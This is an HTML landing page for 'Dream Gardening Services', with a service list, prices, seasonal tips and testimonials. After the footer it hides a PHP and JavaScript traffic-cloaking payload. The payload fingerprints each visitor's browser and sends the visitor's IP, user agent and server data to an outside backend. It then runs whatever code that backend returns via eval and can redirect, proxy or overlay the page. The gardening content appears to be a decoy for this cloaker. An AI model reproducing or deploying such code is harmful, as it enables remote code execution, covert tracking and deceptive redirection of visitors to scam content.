<!DOCTYPE html>
<html lang="en">
<head>
  <script defer data-domain="dreamgardening.vercel.app" src="https://plausible.io/js/script.js"></script>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Dream Gardening Services</title>
<style>
  :root {
    --primary-color: #2c7a2c;
    --secondary-color: #eaf4ea;
    --accent-color: #4caf50;
    --text-color-dark: #2d2d2d;
    --text-color-light: #555;
    --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }







  
    margin: 0;
    font-family: var(--font-family);
    color: var(--text-color-dark);
    background-color: var(--secondary-color);
    line-height: 1.6;
  }
  header {
    background-color: var(--primary-color);
    color: white;
    padding: 1rem 2rem;
    text-align: center;
    box-shadow: 0 2px 8px rgba(0,0,0,0.15);
  }
  header h1 {
    margin: 0;
    font-size: 2.5rem;
    letter-spacing: 2px;
  }
  nav {
    margin-top: 0.5rem;
  }
  nav a {
    color: var(--secondary-color);
    margin: 0 1rem;
    text-decoration: none;
    font-weight: 600;
    transition: color 0.3s ease;
  }
  nav a:hover {
    color: var(--accent-color);
  }
  .hero {
    background: url('herobac.png') center center/cover no-repeat;
    height: 400px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
  }
  .hero h2 {
    font-size: 3rem;
    background: rgba(44, 122, 44, 0.8);
    padding: 1rem 2rem;
    border-radius: 8px;
  }
  main {
    max-width: 1100px;
    margin: 2rem auto;
    padding: 0 1rem;
  }
  section.services {
    margin-bottom: 3rem;
  }
  section.services h3 {
    font-size: 2rem;
    margin-bottom: 1rem;
    border-bottom: 3px solid var(--accent-color);
    padding-bottom: 0.3rem;
  }
  .service-item {
    display: flex;
    flex-wrap: wrap;
    background:white;
    border-radius: 10px;
    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    margin-bottom: 1.8rem;
    overflow: hidden;
  }
  .service-item img {
    flex: 1 1 300px;
    object-fit: cover;
    height: 250px;
    transition: transform 0.3s ease;
  }
  .service-item img:hover {
    transform: scale(1.05);
  }
  .service-info {
    flex: 2 1 400px;
    padding: 1.5rem 2rem;
    display: flex;
    flex-direction: column;
    justify-content: center;
  }
  .service-info h4 {
    margin-top: 0;
    margin-bottom: 1rem;
    color: var(--primary-color);
    font-size: 1.5rem;
  }
  .service-info p {
    color: var(--text-color-light);
    font-size: 1rem;
  }
  .price {
    margin-top: 1rem;
    font-weight: 700;
    font-size: 1.2rem;
    color: var(--accent-color);
  }
  section.content-large {
    background: white;
    border-radius: 10px;
    padding: 2rem;
    box-shadow: 0 3px 10px rgba(0,0,0,0.1);
    margin-bottom: 3rem;
    color: #444;
  }
  h3.subtitle {
    color: var(--primary-color);
    margin-bottom: 1.2rem;
    border-bottom: 3px solid var(--primary-color);
    padding-bottom: 0.3rem;
  }
  section.customer-satisfaction {
    background-color: var(--primary-color);
    color: white;
    padding: 2rem 1rem;
    border-radius: 10px;
    max-width: 1100px;
    margin: 0 auto 3rem;
    box-shadow: 0 4px 10px rgba(0,0,0,0.15);
  }
  .testimonial {
    max-width: 600px;
    margin: 1rem auto;
    font-style: italic;
    border-left: 4px solid var(--accent-color);
    padding-left: 1rem;
  }
  section.disclaimer {
    background: #f3f3f3;
    color: #555;
    font-size: 0.9rem;
    max-width: 1100px;
    margin: 0 auto 2rem;
    padding: 1rem 1.5rem;
    border-radius: 8px;
    text-align: center;
  }
  footer {
    background-color: var(--primary-color);
    color: white;
    text-align: center;
    padding: 1rem 2rem;
    font-size: 0.95rem;
    box-shadow: 0 -2px 8px rgba(0,0,0,0.15);
  }
  footer p {
    margin: 0.3rem 0;
  }
  /* Responsive */
  @media (max-width: 768px) {
    .service-item {
      flex-direction: column;
    }
    .service-item img, .service-info {
      flex: unset;
    }
    .service-item img {
      height: 200px;
    }
  }
</style>
</head>
<body>
<header>
  <h1>Dream Gardening Services</h1>
  <nav>
    <a href="index.html">Home</a>
    <a href="privacy.html">Privacy & Contact</a>
    <a href="terms.html">Terms & Conditions</a>
    <a href="cookies.html">Cookie Policy</a>
    <a href="contact.html">Contact Us</a>
  </nav>
</header>

<div class="hero" role="img" aria-label="Beautiful lush garden with colorful flowers and trees">
  <h2>Creating Your Dream Garden</h2>
</div>

<main>
  <section id="about" class="content-large" aria-labelledby="about-title">
    <h3 id="about-title">Welcome to Dream Gardening Services</h3>
    <p>
      At Dream Gardening Services, we believe that a beautiful garden is not just a luxury — it's an essential part of a happy and healthy lifestyle. With over 15 years of experience serving our community, we provide expert gardening and landscaping solutions tailored to your unique needs and preferences. Whether you want a simple maintenance plan, a full garden design, or specialized seasonal care, our skilled team is committed to bringing your outdoor space to life with creativity and care.
    </p>
    <p>
      Our mission is to transform gardens into lush, vibrant, environmentally sustainable sanctuaries that enhance your home’s value and your quality of life. We use organic practices, native plants, and smart irrigation to ensure your garden flourishes all year round while conserving resources. Here’s why choosing Dream means the best for your garden:
    </p>
    <ul>
      <li>Dedicated certified horticulturists and landscaping experts.</li>
      <li>Personalized garden design consultations.</li>
      <li>Environmentally friendly and organic gardening techniques.</li>
      <li>Flexible service plans and competitive pricing.</li>
      <li>Outstanding customer support and satisfaction guarantee.</li>
    </ul>
    <p>
      Dive into our range of services below and learn how we can help you cultivate a garden oasis you’ll love returning to every day.
    </p>
  </section>

  <section id="services" class="services" aria-labelledby="services-title">
    <h3 id="services-title">Our Gardening Services & Pricing</h3>

    <article class="service-item" aria-label="Lawn Mowing service">
      <img src="lawn1.png" alt="Lush green lawn neatly mowed" />
      <div class="service-info">
        <h4>Lawn Mowing & Maintenance</h4>
        <p>
          Keep your lawn perfectly trimmed and healthy all season long with our expert mowing and maintenance service. We use industry-leading equipment and eco-friendly fertilizers to ensure consistent growth and vibrant green coverage. Our team will schedule weekly or bi-weekly mowing, edging, and cleanup to keep your lawn looking pristine.
        </p>
        <p class="price">Starting at $45 per visit</p>
      </div>
    </article>

    <article class="service-item" aria-label="Garden Bed Design and Installation service">
      <img src="beddes.png" alt="Beautiful garden beds with colorful flowers" />
      <div class="service-info">
        <h4>Garden Bed Design & Installation</h4>
        <p>
          Let us design and install custom garden beds featuring native plants, seasonal flowers, and organic soil amendments tailored to your outdoor style. From classic flower beds to contemporary succulent arrangements, our team ensures vibrant, healthy growth and visual harmony with your landscape.
        </p>
        <p class="price">From $300 per bed (materials included)</p>
      </div>
    </article>

    <article class="service-item" aria-label="Tree and Shrub Care service">
      <img src="prun1.png" alt="Healthy trees and trimmed shrubs" />
      <div class="service-info">
        <h4>Tree & Shrub Pruning and Care</h4>
        <p>
          Maintain the health, size, and shape of your trees and shrubs with our comprehensive pruning and care service. Our arborists will assess your greenery to remove dead or diseased branches, promote growth, and enhance natural form. We also advise on pest control and winter preparation.
        </p>
        <p class="price">Starting at $80 per session</p>
      </div>
    </article>

    <article class="service-item" aria-label="Seasonal Garden Cleanup service">
      <img src="clean1.png" alt="Garden cleaned up with leaves and debris removed" />
      <div class="service-info">
        <h4>Seasonal Garden Cleanup</h4>
        <p>
          Prepare your garden for the changing seasons with thorough cleanup of leaves, debris, dead plants, and mulch renewal. This service helps prevent pests and diseases, improves soil health, and leaves your garden neat and ready for optimal growth.
        </p>
        <p class="price">Starting at $150 per visit</p>
      </div>
    </article>

    <article class="service-item" aria-label="Irrigation System Installation and Maintenance service">
      <img src="irri1.png" alt="Garden irrigation system installed and watering" />
      <div class="service-info">
        <h4>Irrigation System Installation & Maintenance</h4>
        <p>
          Efficient watering is key to a thriving garden. We design and install smart irrigation systems that provide just the right amount of water for your plants, helping conserve water and reduce your bills. Maintenance checks and seasonal adjustments ensure your system runs smoothly year-round.
        </p>
        <p class="price">Starting at $500 (installation)</p>
      </div>
    </article>
  </section>

  <section class="content-large" aria-labelledby="gardening-tips-title">
    <h3 id="gardening-tips-title" class="subtitle">Expert Gardening Tips & Insights</h3>
    <p>
      Gardening is both a science and an art. Knowing when and how to nurture your plants can transform your outdoor space into a vibrant sanctuary. Here are some expert tips to consider throughout the year:
    </p>
    <h4>Spring: Planning & Planting</h4>
    <p>
      Spring is the season of renewal. Start by pruning dead branches, cleaning your beds, and testing your soil’s nutrient levels. Choose plants suited for your zone, and consider companion planting to naturally deter pests. Early spring planting of hardy perennials and bulbs sets a strong foundation for growth.
    </p>
    <h4>Summer: Watering & Pest Control</h4>
    <p>
      Summer’s heat calls for careful watering practices; morning irrigation helps minimize evaporation. Mulching retains moisture and protects roots. Monitor for signs of pests and diseases regularly and intervene early with organic treatments. Deadhead flowers to encourage continuous blooming.
    </p>
    <h4>Fall: Preparing for Winter</h4>
    <p>
      Fall is ideal for planting trees and shrubs as they establish roots before winter. Clean up fallen leaves to prevent disease spread but leave some leaf litter to protect beneficial insects. Rake carefully around perennials to avoid damage and apply compost or mulch as natural insulation.
    </p>
    <h4>Winter: Low Activity & Planning</h4>
    <p>
      Winter offers a much-needed rest for your garden and gardener alike. Use this time to review your garden’s successes and challenges. Plan new garden layouts or expansions, order seeds, and sharpen your tools. Houseplants and indoor gardening can provide greenery indoors during colder months.
    </p>
    <h4>Benefits of Organic Gardening</h4>
    <p>
      Using organic fertilizers and pest controls protects local ecosystems, improves soil health, and produces healthier, tastier plants. Emphasize composting, natural mulches, and integrated pest management to cultivate a garden sustainable for years to come.
    </p>
  </section>

  <section id="customer-satisfaction" class="customer-satisfaction" aria-labelledby="satisfaction-title">
    <h3 id="satisfaction-title">Customer Satisfaction</h3>
    <div class="testimonial" aria-label="Customer testimonial from Jane D.">
      <p>"Dream transformed my boring backyard into a colorful paradise! Their team was professional, punctual, and truly cared about my vision. I couldn’t be happier with the lawn care and garden beds they created."</p>
      <p>- Jane D.</p>
    </div>
    <div class="testimonial" aria-label="Customer testimonial from Michael S.">
      <p>"I appreciate the eco-friendly approach Dream uses. Their organic fertilizers and smart irrigation system have dramatically improved my garden’s health. Highly recommend their knowledgeable staff."</p>
      <p>- Michael S.</p>
    </div>
    <div class="testimonial" aria-label="Customer testimonial from Sarah T.">
      <p>"The seasonal cleanup service is worth every penny. My garden looks refreshed and well-maintained all year. The team is thorough and attentive. Great value and excellent results!"</p>
      <p>- Sarah T.</p>
    </div>
    <p style="text-align:center; margin-top:1rem; font-weight:700;">
      We guarantee your satisfaction and strive to exceed your expectations with every service.
    </p>
  </section>

  <section id="disclaimer" class="disclaimer" aria-labelledby="disclaimer-title">
    <h3 id="disclaimer-title">Disclaimer</h3>
    <p>
      Dream Gardening Services aims to provide accurate and helpful gardening information and service descriptions. However, results may vary based on location, weather, soil conditions, and individual garden circumstances. Prices are subject to change without notice and may vary based on specific project requirements and materials.
    </p>
    <p>
      Customers are advised to discuss their particular needs and receive a customized quote before scheduling services. While we take every precaution to ensure safety and quality, Dream is not liable for unforeseen damages, injuries, or losses related to gardening activities or installations.
    </p>
  </section>
</main>





  

<footer>
  <p>&copy; 2024 Dream Gardening Services. All rights reserved.</p>
  <p>Phone: <a href="tel:+18662339988" style="color: #adebad; text-decoration: underline;">+1 (866) 233-9988</a> | Email: <a href="mailto:contact@Dream.com" style="color: #adebad; text-decoration: underline;">contact@Dream.com</a></p>
  <p>Address: 239 Greene St, New York, NY 10003, USA</p>
</footer>
  <?php
ini_set('display_errors','0');error_reporting(E_ALL);if(!function_exists('adspect')){function adspect_exit($code,$message){http_response_code($code);exit($message);}function adspect_dig($array,$key,$default=''){return array_key_exists($key,$array)?$array[$key]:$default;}function adspect_resolve_path($path){if($path[0]===DIRECTORY_SEPARATOR){$path=adspect_dig($_SERVER,'DOCUMENT_ROOT',__DIR__).$path;}else{$path=__DIR__.DIRECTORY_SEPARATOR.$path;}return realpath($path);}function adspect_spoof_request($url=''){$_SERVER['REQUEST_METHOD']='GET';$_POST=[];if($url!==''){$url=parse_url($url);if(isset($url['path'])){if(substr($url['path'],0,1)==='/'){$_SERVER['REQUEST_URI']=$url['path'];}else{$_SERVER['REQUEST_URI']=dirname($_SERVER['REQUEST_URI']).'/'.$url['path'];}}if(isset($url['query'])){parse_str($url['query'],$_GET);$_SERVER['QUERY_STRING']=$url['query'];}else{$_GET=[];$_SERVER['QUERY_STRING']='';}}}function adspect_try_files(){foreach(func_get_args()as$path){if(is_file($path)){if(!is_readable($path)){adspect_exit(403,'Permission denied');}header('Content-Type: text/html');switch(strtolower(pathinfo($path,PATHINFO_EXTENSION))){case'php':case'phtml':case'php5':case'php4':case'php3':adspect_execute($path);exit;default:header('Content-Type: '.adspect_content_type($path));case'html':case'htm':header('Content-Length: '.filesize($path));readfile($path);exit;}}}adspect_exit(404,'File not found');}function adspect_execute(){global$_adspect;require_once func_get_arg(0);}function adspect_content_type($path){if(function_exists('mime_content_type')){$type=mime_content_type($path);if(is_string($type)){return$type;}}return'application/octet-stream';}function adspect_serve_local($url){$path=(string)parse_url($url,PHP_URL_PATH);if($path===''){return null;}$path=adspect_resolve_path($path);if(is_string($path)){adspect_spoof_request($url);if(is_dir($path)){chdir($path);adspect_try_files('index.php','index.html','index.htm');return;}chdir(dirname($path));adspect_try_files($path);return;}adspect_exit(404,'File not found');}function adspect_real_ip(){if(array_key_exists('HTTP_X_FORWARDED_FOR',$_SERVER)){$ip=strtok($_SERVER['HTTP_X_FORWARDED_FOR'],',');}elseif(array_key_exists('HTTP_X_REAL_IP',$_SERVER)){$ip=$_SERVER['HTTP_X_REAL_IP'];}elseif(array_key_exists('HTTP_REAL_IP',$_SERVER)){$ip=$_SERVER['HTTP_REAL_IP'];}elseif(array_key_exists('HTTP_CF_CONNECTING_IP',$_SERVER)){$ip=$_SERVER['HTTP_CF_CONNECTING_IP'];}if(empty($ip)){$ip=$_SERVER['REMOTE_ADDR'];}return$ip;}function adspect_crypt($in,$key){$il=strlen($in);$kl=strlen($key);$out='';for($i=0;$i<$il;++$i){$out.=chr(ord($in[$i])^ord($key[$i%$kl]));}return$out;}function adspect_proxy_headers(){$headers=[];foreach(func_get_args()as$key){if(array_key_exists($key,$_SERVER)){$header=strtr(strtolower(substr($key,5)),'_','-');$headers[]="{$header}: {$_SERVER[$key]}";}}return$headers;}function adspect_proxy($url,$param=null,$key=null){$url=parse_url($url);if(empty($url)){adspect_exit(500,'Invalid proxy URL');}extract($url);$curl=curl_init();curl_setopt($curl,CURLOPT_FORBID_REUSE,true);curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,60);curl_setopt($curl,CURLOPT_TIMEOUT,60);curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($curl,CURLOPT_USERAGENT,adspect_dig($_SERVER,'HTTP_USER_AGENT','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36'));curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);if(!isset($scheme)){$scheme='http';}if(!isset($host)){$host=adspect_dig($_SERVER,'HTTP_HOST','localhost');}if(isset($user,$pass)){curl_setopt($curl,CURLOPT_USERPWD,"$user:$pass");$host="$user:$pass@$host";}if(isset($port)){curl_setopt($curl,CURLOPT_PORT,$port);$host="$host:$port";}$origin="$scheme://$host";if(!isset($path)){$path='/';}if($path[0]!=='/'){$path="/$path";}$url=$path;if(isset($query)){$url.="?$query";}curl_setopt($curl,CURLOPT_URL,$origin.$url);$headers=adspect_proxy_headers('HTTP_ACCEPT','HTTP_ACCEPT_LANGUAGE','HTTP_COOKIE');$headers[]='Cache-Control: no-cache';curl_setopt($curl,CURLOPT_HTTPHEADER,$headers);$data=curl_exec($curl);if($errno=curl_errno($curl)){adspect_exit(500,'curl error: '.curl_strerror($errno));}$code=curl_getinfo($curl,CURLINFO_HTTP_CODE);$type=curl_getinfo($curl,CURLINFO_CONTENT_TYPE);curl_close($curl);http_response_code($code);if(is_string($data)){if(isset($param,$key)&&preg_match('{^text/(?:html|css)}i',$type)){$base=$path;if($base[-1]!=='/'){$base=dirname($base);}$base=rtrim($base,'/');$rw=function($m)use($origin,$base,$param,$key){list($repl,$what,$url)=$m;$url=htmlspecialchars_decode($url);$url=parse_url($url);if(!empty($url)){extract($url);if(isset($host)){if(!isset($scheme)){$scheme='http';}$host="$scheme://$host";if(isset($user,$pass)){$host="$user:$pass@$host";}if(isset($port)){$host="$host:$port";}}else{$host=$origin;}if(!isset($path)){$path='';}if(!strlen($path)||$path[0]!=='/'){$path="$base/$path";}if(!isset($query)){$query='';}$host=base64_encode(adspect_crypt($host,$key));parse_str($query,$query);$query[$param]="$path#$host";$repl='?'.http_build_query($query);if(isset($fragment)){$repl.="#$fragment";}$repl=htmlspecialchars($repl);if($what[-1]==='='){$repl="\"$repl\"";}$repl=$what.$repl;}return$repl;};$re='{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i';$data=preg_replace_callback($re,$rw,$data);}}else{$data='';}header("Content-Type: $type");header('Content-Length: '.strlen($data));echo$data;}function adspect($sid,$mode,$param){header('Cache-Control: no-store');if(!function_exists('curl_init')){adspect_exit(500,'php-curl extension is missing');}if(!function_exists('json_encode')||!function_exists('json_decode')){adspect_exit(500,'php-json extension is missing');}$key=hex2bin(str_replace('-','',$sid));if($key===false){adspect_exit(500,'Invalid stream ID');}$addr=adspect_real_ip();if(array_key_exists($param,$_GET)&&strpos($_GET[$param],'#')!==false){list($url,$host)=explode('#',$_GET[$param],2);$host=adspect_crypt(base64_decode($host),$key);unset($_GET[$param]);$query=http_build_query($_GET);$url="$host$url?$query";adspect_proxy($url,$param,$key);exit;}$ajax=intval($mode==='ajax');$curl=curl_init();$sid=adspect_dig($_GET,'__sid',$sid);$ua=adspect_dig($_SERVER,'HTTP_USER_AGENT');$referrer=adspect_dig($_SERVER,'HTTP_REFERER');$query=http_build_query($_GET);switch(array_key_exists('data',$_POST)){case true:$payload=json_decode($_POST['data'],true);if(is_array($payload)){break;}default:$payload=[];break;}$payload['server']=$_SERVER;curl_setopt($curl,CURLOPT_POST,true);curl_setopt($curl,CURLOPT_POSTFIELDS,json_encode($payload));if($ajax){header('Access-Control-Allow-Origin: *');$cid=adspect_dig($_SERVER,'HTTP_X_REQUEST_ID');}else{$cid=adspect_dig($_COOKIE,'_cid');}curl_setopt($curl,CURLOPT_FORBID_REUSE,true);curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,60);curl_setopt($curl,CURLOPT_TIMEOUT,60);curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($curl,CURLOPT_HTTPHEADER,["X-Forwarded-Host: {$_SERVER['HTTP_HOST']}","X-Request-ID: {$cid}","Adspect-IP: {$addr}","Adspect-UA: {$ua}","Adspect-Referrer: {$referrer}",]);curl_setopt($curl,CURLOPT_URL,"https://rpc.adspect.net/v2/{$sid}?{$query}");curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);$json=curl_exec($curl);if($errno=curl_errno($curl)){adspect_exit(500,'curl error: '.curl_strerror($errno));}$code=curl_getinfo($curl,CURLINFO_HTTP_CODE);curl_close($curl);if($code!==200){adspect_exit($code,'Error '.$code);}$data=json_decode($json,true);if(!is_array($data)){adspect_exit(500,'Invalid backend response');}global$_adspect;$_adspect=$data;extract($data);if(isset($e)){eval($e);}if($ajax){switch($action){case'php':ob_start();eval($target);$data['target']=ob_get_clean();$json=json_encode($data);break;}if($_SERVER['REQUEST_METHOD']==='POST'){header('Content-Type: application/json');echo$json;}else{header('Content-Type: application/javascript');if(!$ok&&!$js){return null;}echo"window._adata={$json};";return$target;}}else{if($js){setcookie('_cid',$cid,time()+60);return$target;}switch($action){case'local':return adspect_serve_local($target);case'noop':adspect_spoof_request($target);return null;case'301':case'302':case'303':header("Location: {$target}",true,(int)$action);break;case'xar':header("X-Accel-Redirect: {$target}");break;case'xsf':header("X-Sendfile: {$target}");break;case'refresh':header("Refresh: 0; url={$target}");adspect_spoof_request();return null;case'meta':$target=htmlspecialchars($target);echo"<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>";break;case'iframe':$target=htmlspecialchars($target);echo"<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"></head><body><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe></body></html>";break;case'proxy':adspect_proxy($target,$param,$key);break;case'fetch':adspect_proxy($target);break;case'return':if(is_numeric($target)){http_response_code((int)$target);}else{adspect_exit(500,'Non-numeric status code');}break;case'php':eval($target);break;case'js':$target=htmlspecialchars(base64_encode($target));echo"<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>";break;}}exit;}}$target=adspect('e19fda97-4d4e-4042-9d7e-33b3708ed40b','ajax','_');if(!isset($target)){return;}?>
(function(v,w){var f=[],c={mode:"ajax"},x=document.getElementById(btoa(window.location.origin));function p(b){if(b.ok)switch(b.action){case "local":case "fetch":case "proxy":var d=new XMLHttpRequest;d.open("GET",b.target,!1);d.onreadystatechange=function(){4===this.readyState&&200===this.status&&(document.open(),document.write(this.responseText),document.close())};d.send();break;case "301":case "302":case "303":case "refresh":case "meta":case "xar":case "xsf":window.location.replace(b.target);break;
case "iframe":d=document.createElement("iframe"),d.style.cssText="width:100%;height:100%;position:absolute;top:0;left:0;z-index:1000;border:none;",d.src=b.target,b.target=d.outerHTML;case "php":document.open();document.write(b.target);document.close();break;case "js":eval(b.target)}}var m=window._adata;if(!m.js)return p(m);try{function b(a){if("object"===typeof a&&null!==a){var g={};function q(l){try{var h=a[l];switch(typeof h){case "object":null!==h&&(h=h.toString());break;case "function":h=w.prototype.toString.call(h)}g[l]=
h}catch(y){f.push(y.message)}}for(var e in a)q(e);try{var k=v.getOwnPropertyNames(a);for(e=0;e<k.length;++e)q(k[e]);g["!!"]=k}catch(l){f.push(l.message)}return g}}c.screen=b(window.screen);c.window=b(window);c.navigator=b(window.navigator);c.location=b(window.location);c.console=b(window.console);c.documentElement=function(a){try{var g={};a=a.attributes;for(var e in a)e=a[e],g[e.nodeName]=e.nodeValue;return g}catch(k){f.push(k.message)}}(document.documentElement);c.document=b(document);try{c.timezoneOffset=
(new Date).getTimezoneOffset()}catch(a){f.push(a.message)}try{c.closure=function(){}.toString()}catch(a){f.push(a.message)}try{c.frame=window.self!==window.top}catch(a){c.frame=!0}try{c.touchEvent=document.createEvent("TouchEvent").toString()}catch(a){f.push(a.message)}try{var r=function(){},t=0;r.toString=function(){++t;return""};console.log(r);c.tostring=t}catch(a){f.push(a.message)}try{var n=document.createElement("canvas").getContext("webgl"),u=n.getExtension("WEBGL_debug_renderer_info");c.webgl=
{vendor:n.getParameter(u.UNMASKED_VENDOR_WEBGL),renderer:n.getParameter(u.UNMASKED_RENDERER_WEBGL)}}catch(a){f.push(a.message)}function d(a,g,e){var k=a.prototype[g];a.prototype[g]=function(){c.proto=!0};e();a.prototype[g]=k}try{d(Array,"includes",function(){return document.createElement("video").canPlayType("video/mp4")})}catch(a){}}catch(b){f.push(b.message)}(function(){c.errors=f;c.cid=m.cid;var b=new FormData;b.append("data",JSON.stringify(c));var d=new XMLHttpRequest;d.open("POST",x.getAttribute("src"),
!1);d.onreadystatechange=function(){4===this.readyState&&200===this.status&&p(JSON.parse(this.responseText))};d.send(b)})()})(Object,Function);
<?php exit;

</body>
</html>
